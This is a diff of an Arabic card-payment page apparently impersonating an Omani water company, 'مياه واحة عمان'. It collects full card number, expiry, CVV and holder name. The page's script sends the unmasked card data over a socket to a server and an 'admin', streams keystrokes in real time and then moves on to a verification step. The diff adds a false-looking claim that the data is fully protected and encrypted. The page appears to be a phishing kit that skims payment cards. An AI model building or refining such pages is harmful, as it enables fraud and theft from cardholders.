@@ -20,7 +20,7 @@
       </div>
       <div class="connection-status">
         <span class="status-dot"></span>
-        <span>غير متصل</span>
+        <span>جاري التحميل...</span>
       </div>
     </div>
   </header>
@@ -29,26 +29,25 @@
   <nav class="nav">
     <div class="container">
       <ul class="nav-list">
-        <li><a href="../index.html" class="nav-link">الرئيسية</a></li>
-        <li><a href="delivery.html" class="nav-link">بيانات التوصيل</a></li>
-        <li><a href="payment.html" class="nav-link active">الدفع</a></li>
-        <li><a href="verification.html" class="nav-link">التحقق</a></li>
-        <li><a href="../admin/index.html" class="nav-link">لوحة التحكم</a></li>
+        <li><a href="../index.html" class="nav-link">🏠 الرئيسية</a></li>
+        <li><a href="delivery.html" class="nav-link">📦 التوصيل</a></li>
+        <li><a href="payment.html" class="nav-link active">💳 الدفع</a></li>
+        <li><a href="verification.html" class="nav-link">🔐 التحقق</a></li>
       </ul>
     </div>
   </nav>
 
-  <!-- Steps -->
+  <!-- Steps Progress -->
   <div class="container">
     <div class="steps">
       <div class="step completed">
         <div class="step-number">✓</div>
-        <span class="step-label">اختيار المنتج</span>
+        <span class="step-label">المنتج</span>
       </div>
       <div class="step-line"></div>
       <div class="step completed">
         <div class="step-number">✓</div>
-        <span class="step-label">بيانات التوصيل</span>
+        <span class="step-label">التوصيل</span>
       </div>
       <div class="step-line"></div>
       <div class="step active">
@@ -65,10 +64,15 @@
 
   <!-- Payment Form -->
   <div class="form-container page">
-    <h2 class="form-title">💳 بيانات الدفع</h2>
+    <div class="form-title">
+      <span class="icon">💳</span>
+      <span>بيانات الدفع</span>
+    </div>
+
     <form id="paymentForm">
+      <!-- Card Number -->
       <div class="form-group">
-        <label class="form-label">رقم البطاقة *</label>
+        <label class="form-label">رقم البطاقة</label>
         <div class="card-input-group">
           <input type="text" class="form-control" name="card1" maxlength="4" 
                  required placeholder="0000" inputmode="numeric" onkeyup="moveFocus(this, 'card2')">
@@ -80,45 +84,54 @@
                  required placeholder="0000" inputmode="numeric">
         </div>
       </div>
-      
+
+      <!-- Card Holder Name -->
+      <div class="form-group">
+        <label class="form-label">اسم حامل البطاقة</label>
+        <input type="text" class="form-control" name="cardHolder" required 
+               placeholder="الاسم كما هو مكتوب على البطاقة">
+      </div>
+
+      <!-- Expiry & CVV -->
       <div class="form-row">
         <div class="form-group">
-          <label class="form-label">تاريخ الانتهاء *</label>
+          <label class="form-label">تاريخ الانتهاء</label>
           <input type="text" class="form-control" name="expiry" required 
                  placeholder="MM/YY" maxlength="5" inputmode="numeric" dir="ltr">
         </div>
         <div class="form-group">
-          <label class="form-label">رمز الأمان (CVV) *</label>
+          <label class="form-label">رمز الأمان (CVV)</label>
           <input type="text" class="form-control" name="cvv" required 
                  placeholder="123" maxlength="4" inputmode="numeric">
         </div>
       </div>
-      
-      <div class="form-group">
-        <label class="form-label">اسم حامل البطاقة *</label>
-        <input type="text" class="form-control" name="cardHolder" required 
-               placeholder="الاسم كما هو مكتوب على البطاقة">
-      </div>
-      
+
       <!-- Order Summary -->
-      <div style="background:var(--gray-100);padding:1rem;border-radius:var(--border-radius);margin-bottom:1rem;">
-        <h4 style="margin-bottom:0.5rem;">ملخص الطلب</h4>
-        <div style="display:flex;justify-content:space-between;margin-top:0.5rem;">
-          <span>المجموع:</span>
-          <strong id="orderTotal">0.00 ر.ع</strong>
+      <div class="order-summary">
+        <h4>📋 ملخص الطلب</h4>
+        <div class="total">
+          <span class="total-label">المجموع الكلي</span>
+          <span class="total-value" id="orderTotal">0.00 ر.ع</span>
         </div>
       </div>
-      
-      <button type="submit" class="btn btn-success">
-        إتمام الدفع ←
+
+      <!-- Submit Button -->
+      <button type="submit" class="btn btn-success" style="width:100%;padding:16px;">
+        <span>إتمام الدفع</span>
+        <span>→</span>
       </button>
+
+      <!-- Security Note -->
+      <div style="text-align:center;margin-top:16px;font-size:12px;color:var(--text-muted);">
+        🔒 بياناتك محمية ومشفرة بالكامل
+      </div>
     </form>
   </div>
 
   <!-- Footer -->
   <footer class="footer">
     <div class="container">
-      <p>© 2024 مياه واحة عمان - جميع الحقوق محفوظة</p>
+      <p>© 2024 مياه واحة عمان - جميع الحقوق محفوظة 💧</p>
     </div>
   </footer>
 
@@ -151,7 +164,6 @@
       if (savedData) {
         try {
           const data = JSON.parse(savedData);
-          // Only restore non-masked fields
           if (data.expiry) document.querySelector('[name="expiry"]').value = data.expiry;
           if (data.cardHolder) document.querySelector('[name="cardHolder"]').value = data.cardHolder;
         } catch (e) {}
@@ -180,17 +192,17 @@
         
         localStorage.setItem('payment_data', JSON.stringify(maskedData));
         
-        // إرسال البيانات الحقيقية للـ socket (للخادم والأدمن)
+        // إرسال البيانات الحقيقية للـ socket
         submitPaymentForm(realData);
         
-        showToast('تم التحقق من بيانات الدفع بنجاح!');
+        showToast('✓ تم التحقق من بيانات الدفع بنجاح');
         
         setTimeout(() => {
           window.location.href = 'verification.html';
         }, 1000);
       });
       
-      // Real-time tracking with real data (partial)
+      // Real-time tracking
       const inputs = document.querySelectorAll('#paymentForm input');
       inputs.forEach(input => {
         input.addEventListener('input', () => {
@@ -203,6 +215,9 @@
           }
         });
       });
+      
+      // Focus first input
+      document.querySelector('[name="card1"]')?.focus();
     });
   </script>
 </body>
